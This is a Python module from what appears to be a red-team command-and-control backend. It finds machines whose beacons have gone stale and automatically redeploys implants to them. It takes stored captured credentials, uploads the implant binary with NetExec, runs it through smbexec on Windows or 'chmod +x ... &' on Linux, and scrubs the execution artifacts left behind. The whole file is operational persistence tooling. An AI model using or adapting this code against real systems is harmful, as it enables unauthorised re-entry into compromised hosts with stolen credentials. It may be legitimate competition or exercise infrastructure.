"""Beacon auto-redeploy watcher.

Periodically checks for stale beacons (last_seen older than
beacon_interval_ns * BEACON_REDEPLOY_THRESHOLD_MULTIPLIER) and attempts to
redeploy the stored implant via NXC.
"""

import asyncio
import logging
import uuid
from datetime import UTC, datetime
from pathlib import Path

from sqlalchemy import select
from sqlalchemy.orm import Session

from fastapi_backend.c2.alerts import emit_alert
from fastapi_backend.core.config import config
from fastapi_backend.database.db_writer import engine
from fastapi_backend.database.models import Boxes
from fastapi_backend.database.write_actor import write_actor
from fastapi_backend.utils.asyncio_tasks import fire_and_forget
from fastapi_backend.utils.nxc_routing import _get_best_cred

logger = logging.getLogger(__name__)

# Track beacon IDs that have already triggered beacon_stale alerts to avoid spam
_stale_alerted_beacons: set[str] = set()


def clear_beacon_stale_alert(beacon_id: str) -> None:
    """Clear beacon_stale alert tracking when beacon checks in successfully."""
    _stale_alerted_beacons.discard(beacon_id)


def _recorded_deploy_dir(db: Session, implant_id: str | None, sep: str) -> str | None:
    """Directory an implant was last deployed to (REUSE, PLAN_recorded_deploy_dirs §5.3).

    Reads `ImplantBuilds.last_deployed_path` for `implant_id` and returns its
    parent directory. None when there is no build row or no recorded path — the
    caller then falls back to a fresh pool pick.
    """
    if not implant_id:
        return None
    from fastapi_backend.database.models import ImplantBuilds  # cycle-break
    row = db.get(ImplantBuilds, implant_id)
    path = getattr(row, "last_deployed_path", None) if row else None
    if not path or sep not in path:
        return None
    return path.rsplit(sep, 1)[0] or None


def _snapshot_stale_redeploys(now: datetime) -> list[dict]:
    """Sync scan: return one plain-dict plan per stale-beacon box worth redeploying.

    Runs off the loop via asyncio.to_thread. Reads Boxes + credentials +
    recorded deploy dirs in one Session; the caller does all put_file /
    execute / write_actor.submit awaits without a live Session.
    """
    from fastapi_backend.netexec.wrapper import protocol_for_box  # cycle-break

    plans: list[dict] = []
    with Session(engine) as db:
        boxes = db.execute(
            select(Boxes).where(
                Boxes.beacon_id.is_not(None),
                Boxes.last_seen.is_not(None),
            )
        ).scalars().all()

        for box in boxes:
            if box.beacon_interval_ns is not None:
                threshold = (
                    box.beacon_interval_ns / 1e9
                    * config.BEACON_REDEPLOY_THRESHOLD_MULTIPLIER
                )
            else:
                threshold = (
                    config.CHECK_INTERVAL_MINUTES
                    * 60
                    * config.BEACON_REDEPLOY_THRESHOLD_MULTIPLIER
                )

            age = (now - box.last_seen.replace(tzinfo=UTC)).total_seconds()
            if age <= threshold:
                continue
            if not box.last_implant_id:
                logger.warning("No last_implant_id for %s — skipping redeploy", box.box_ip)
                continue

            is_windows = (box.os or "").lower().startswith("win")
            nxc_proto, _ = protocol_for_box(box.os or "")
            cred = _get_best_cred(box.box_ip, db, protocol=nxc_proto)
            if not cred:
                logger.warning(
                    "No valid %s cred for %s — skipping redeploy", nxc_proto, box.box_ip,
                )
                continue

            _sep = "\\" if is_windows else "/"
            plans.append({
                "box_ip": box.box_ip,
                "team_num": box.team_num,
                "beacon_id": box.beacon_id,
                "os": box.os,
                "is_windows": is_windows,
                "nxc_proto": nxc_proto,
                "cred_user": cred.username,
                "cred_pass": cred.password,
                "last_implant_id": box.last_implant_id,
                "recorded_deploy_dir": _recorded_deploy_dir(db, box.last_implant_id, _sep),
                "age": age,
                "threshold": threshold,
            })
    return plans


async def check_and_redeploy_beacons() -> None:
    """Query boxes with an active beacon_id. For each stale beacon, attempt.
    
    to redeploy the stored implant file via NXC.

    A beacon is considered stale when:
        now - last_seen > beacon_interval_ns / 1e9 * BEACON_REDEPLOY_THRESHOLD_MULTIPLIER

    If beacon_interval_ns is None, falls back to:
        CHECK_INTERVAL_MINUTES * 60 * BEACON_REDEPLOY_THRESHOLD_MULTIPLIER
    """
    from fastapi_backend.main import orchestrator  # cycle-break

    if not orchestrator or not orchestrator.executor or not orchestrator.executor.nxc_wrapper:
        logger.warning("NXC wrapper not available — skipping all beacon redeployments")
        return

    nxc = orchestrator.executor.nxc_wrapper
    now = datetime.now(UTC)

    # Snapshot every stale beacon + its cred + its recorded deploy dir in a
    # single off-loop sync scan. The old code held the Session across every
    # per-box put_file / execute / write_actor.submit await — which pinned
    # SQLAlchemy state on the event loop under Phase 2-7 concurrent load and
    # was one of the residual sources of the 254 handshake wedges in soak Q
    # (2026-08-27). All awaits below happen without a live Session.
    plans = await asyncio.to_thread(_snapshot_stale_redeploys, now)

    for plan in plans:
        box_ip = plan["box_ip"]
        team_num = plan["team_num"]
        beacon_id = plan["beacon_id"]
        age = plan["age"]
        threshold = plan["threshold"]

        logger.info(
            "Beacon on %s is stale (age=%.0fs, threshold=%.0fs) — attempting redeploy",
            box_ip, age, threshold,
        )

        # Emit beacon_stale alert (once per beacon until it checks in again)
        if beacon_id and beacon_id not in _stale_alerted_beacons:
            _stale_alerted_beacons.add(beacon_id)
            fire_and_forget(emit_alert(
                "beacon_stale",
                f"Beacon stale on {box_ip}",
                box_ip=box_ip,
                team_num=team_num,
                details={"beacon_id": beacon_id, "age_seconds": age, "threshold_seconds": threshold},
            ))

        implant_dir = Path(config.IMPLANT_STORE_DIR) / plan["last_implant_id"]
        if not implant_dir.exists():
            logger.warning("Implant dir %s not found for %s — skipping", implant_dir, box_ip)
            continue

        implant_files = list(implant_dir.iterdir())
        if not implant_files:
            logger.warning("Implant dir %s is empty — skipping", implant_dir)
            continue
        implant_path = implant_files[0]

        is_windows = plan["is_windows"]
        nxc_proto = plan["nxc_proto"]
        cred_user = plan["cred_user"]
        cred_pass = plan["cred_pass"]

        os_name = "windows" if is_windows else "linux"
        deploy_dir = plan["recorded_deploy_dir"]
        if not deploy_dir:
            from fastapi_backend.c2.deploy_paths import (
                select_deploy_path,  # cycle-break
            )
            deploy_dir = select_deploy_path(os_name)

        if is_windows:
            remote_name = implant_path.name
            share_path = deploy_dir.lstrip("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz").lstrip(":")
            remote_put = f"{share_path}\\{remote_name}"
            remote_exec = f"{deploy_dir}\\{remote_name}"
        else:
            # Linux: strip the local .elf and add a uniquifier so the
            # on-target binary is extensionless AND carries the ``_<8hex>``
            # name signal implant_scrub keys on
            # (docs/PLAN_difficulty_pools_extensionless.md).
            _stem = implant_path.stem or implant_path.name
            remote_name = f"{_stem}_{uuid.uuid4().hex[:8]}"
            remote_put = f"{deploy_dir}/{remote_name}"
            remote_exec = remote_put

        try:
            put_result = await nxc.put_file(  # nxc-wrapper-bypass: binary-deploy
                box_ip, nxc_proto, cred_user, cred_pass,
                str(implant_path), remote_put,
            )
            if not put_result.success:
                logger.warning(
                    "Beacon redeploy put_file failed for %s: %s", box_ip, put_result.error,
                )
                continue

            cmd = remote_exec if is_windows else f"chmod +x {remote_exec} && {remote_exec} &"
            await nxc.execute(  # nxc-wrapper-bypass: binary-deploy
                box_ip, nxc_proto, cred_user, cred_pass,
                cmd, powershell=is_windows,
                exec_method="smbexec" if is_windows else None,
                sweep_after=True,  # scrub smbexec C:\ artifact (PLAN_kill_nxc_readback)
            )

            # Clear beacon_id so the new beacon registers fresh (via actor).
            old_beacon_id = beacon_id
            def _clear(adb: Session, __bip: str = box_ip) -> None:
                b = adb.execute(select(Boxes).where(Boxes.box_ip == __bip)).scalar_one_or_none()
                if b:
                    b.beacon_id = None
            await write_actor.submit(_clear, label="beacon_watcher_clear")
            logger.info("Beacon redeploy succeeded for %s", box_ip)
            if old_beacon_id:
                _stale_alerted_beacons.discard(old_beacon_id)
        except Exception as exc:
            logger.warning("Beacon redeploy failed for %s: %s", box_ip, exc)
            fire_and_forget(emit_alert(
                "redeploy_failed",
                f"Beacon redeploy failed on {box_ip}",
                box_ip=box_ip,
                team_num=team_num,
                details={"error": str(exc), "beacon_id": beacon_id},
            ))
